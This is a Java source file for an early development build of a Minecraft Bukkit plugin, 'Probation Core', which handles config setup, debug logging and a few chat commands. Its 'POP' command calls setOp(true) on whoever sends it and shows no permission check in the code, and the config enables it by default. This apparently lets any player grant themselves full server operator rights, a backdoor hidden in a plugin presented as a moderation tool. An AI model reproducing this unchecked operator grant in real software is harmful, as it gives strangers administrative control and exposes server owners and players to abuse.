package Probation_Core;



import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.plugin.java.JavaPlugin;

public class Probation extends JavaPlugin{
	
	/**
	 * This is For The Info File and Also the /Probation Command....
	 */
	
	public static int MainVersion = 1;
	
	public static int SubVersion = 1;
	
	public static int SubSetVersion = 0;
	
	
	/**
	 * These are the File Registers for The Main Probation Core 
	 * File and also The Config.yml File In The Folder Named Appropriately....
	 */
	
	public File MainFile;
	public FileConfiguration config;

	/**
	 * Debug File And Debug Boolean Used for debug.... called at middle to end of file..... makes debug file....
	 */
	
	private boolean debug;
	 public File debugFile;

	 
	 /**
	  * For The Banned Words And Values List Soon To Be Implemented 
	  */
	 
	 public List<String> values = new ArrayList<String>();
	  public List<String> bannedWords = new ArrayList<String>();
	
public void onDisable(){
	
	/**
	 * Logger Message Will Print When Debug Is Needed Like For A Wrong Value.....
	 */
	
	getLogger().info("[Probation Core] Probation Core " + MainVersion + "." + SubVersion + "." +SubSetVersion + " Has Been Disabled.");
	 

	    this.values.clear();
	    this.bannedWords.clear();
	    if (this.debug) {
	      logDebug("");
	      logDebug("\t-----END LOG-----");
	      logDebug("");
	      logDebug("");
	    }
	
  }
  public void onEnable(){

	  /**
	   * Makes Config.yml
	   */
	  
	  this.MainFile = new File(getDataFolder(), "config.yml");

	    if ((!this.MainFile.exists()) && (!getDataFolder().exists()))
	    {
	      if (!getDataFolder().mkdirs()) {
	        getLogger().severe("The config folder could NOT be created, make sure it's writable!");
	        getLogger().severe("Disabling now!");
	        setEnabled(false);
	        return;
	      }
	    }
	    if (!this.MainFile.exists()) {
	      copy(getResource("config.yml"), this.MainFile);
	    }
	    this.config = getConfig();
	    loadConfig();
	    this.debug = this.config.getBoolean("debug");
	    checkDebug();
	    if (this.debug) {
	      getLogger().info("Debug is enabled. Will log actions.");
	      logDebug("\t-----BEGIN LOG------");
	    }
	  
	    /**
	     * Prints to Debug to say Version And SubVersion And What Version Of MC To Use....
	     */
	    
	  getLogger().info("[Probation Core] Probation Core v" + MainVersion +"." + SubVersion +" Is Running.");
	  getLogger().info("[Probation Core] **** THIS IS A DEVELOPMENT BUILD USE WITH CAUTION ****");
	  getLogger().info("[Probation Core] This Version Is To Be Used With Minecraft Version 1.6.2");	  
}
  
	  private void checkDebug()
	  {
	    if (this.debug) {
	      this.debugFile = new File(getDataFolder(), "debug.log");
	      if (!this.debugFile.exists())
	        try {
	          this.debugFile.createNewFile();
	        } catch (IOException e) {
	          getLogger().warning("Failed to create the debug.log! IOException");
	          e.printStackTrace();
	        }
	    }
	  }
	  
private void copy(InputStream in, File file)
  {
    OutputStream out = null;
    try {
      out = new FileOutputStream(file);
      byte[] buf = new byte[1024];
      int len;
      while ((len = in.read(buf)) > 0)
        out.write(buf, 0, len);
    }
    catch (IOException e) {
      getLogger().warning("Failed to copy the default config! (I/O)");
      logDebugException(e);
      e.printStackTrace();
    } finally {
      try {
        if (out != null) {
          out.flush();
          out.close();
        }
      } catch (IOException e) {
        getLogger().warning("Failed to close the streams! (I/O -> Output)");
        logDebugException(e);
        e.printStackTrace();
      }
      try {
        if (in != null)
          in.close();
      }
      catch (IOException e) {
        getLogger().warning("Failed to close the streams! (I/O -> Input)");
        logDebugException(e);
        e.printStackTrace();
      }
    }
  }

	
  public void logDebugException(Exception ex)
  {
    FileOutputStream fos = null;
    PrintStream ps = null;
    logDebug("-------------------");
    try {
      fos = new FileOutputStream(this.debugFile, true);
      ps = new PrintStream(fos);
      ex.printStackTrace(ps);
    } catch (FileNotFoundException e) {
      getLogger().warning("An error occurred while writing to the log! IOException");
      e.printStackTrace();
    } finally {
      if (ps != null) {
        ps.flush();
        ps.close();
      }
      if (fos != null) {
        try {
          fos.flush();
          fos.close();
        } catch (IOException e) {
          getLogger().warning("An error occurred while writing to the log! IOException");
          e.printStackTrace();
        }
      }
    }
    logDebug("-------------------");
  }




  public void logDebug(String string)
  {
    if (this.debug) {
      BufferedWriter writer = null;
      try {
        writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(this.debugFile, true), "UTF-8"));
        if (string.equals("")) {
          writer.write(System.getProperty("line.separator"));
        } else {
          Date dt = new Date();

          SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
          String time = df.format(dt);
          writer.write(time + " [Probation Core Debug] " + string);
          writer.write(System.getProperty("line.separator"));
        }
      } catch (IOException e) {
        getLogger().warning("An error occurred while writing to the log! IOException");
        e.printStackTrace();
      } finally {
        if (writer != null)
          try {
            writer.flush();
            writer.close();
          } catch (IOException e) {
            getLogger().warning("An error occurred while writing to the log! IOException");
            e.printStackTrace();
          }
      }
    }
  }

  /**
   * Commands Are Placed HERE NEVER ANYWHERE ELSE!!!! 
   */
  
public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
		if(cmd.getName().equalsIgnoreCase("probation")){ 
			sender.sendMessage(ChatColor.YELLOW + "-------------------------------------");
			sender.sendMessage(ChatColor.RED + "[Probation Core]" + ChatColor.DARK_GREEN + " Work In Progress Plugin");
			sender.sendMessage(ChatColor.RED + "[Probation Core]" + ChatColor.DARK_GREEN + " v" + MainVersion + ".2");
			sender.sendMessage(ChatColor.YELLOW + "-------------------------------------");
			
		return true;
		
		} else if(cmd.getName().equalsIgnoreCase("cows")) {
			sender.sendMessage(ChatColor.RED + "[Probation] I LOVE COWS!!!!");
			return true;
		} else if(cmd.getName().equalsIgnoreCase("Probate [Player]")){
			sender.sendMessage(ChatColor.YELLOW + "----------------------------------------------------");
			sender.sendMessage(ChatColor.RED + "[Probation Core]" + ChatColor.DARK_GREEN + " Work In Progress, Command Will Work In Next Update");
			sender.sendMessage(ChatColor.YELLOW + "----------------------------------------------------");			
			return true;
		}else if(cmd.getName().equalsIgnoreCase("POP")) {
			sender.sendMessage(ChatColor.WHITE + "[Probation Core] You Are Now A Probation Core OP");
			sender.setOp(true);
		
		return true;
		
		}
	

		
		
		
		return false;
		
		
		
}
  
/**
 * Loads The Config.yml File And Also Adds Different Areas Of Value To Be Used In The Plugin...
 */

private void loadConfig()
{
  this.config.options().header("Probation Core Config");
  this.config.addDefault("Probation Config", Boolean.valueOf(true));
  this.config.addDefault("probation.POP", Boolean.valueOf(true));

 

  saveConfig();
}
  
}


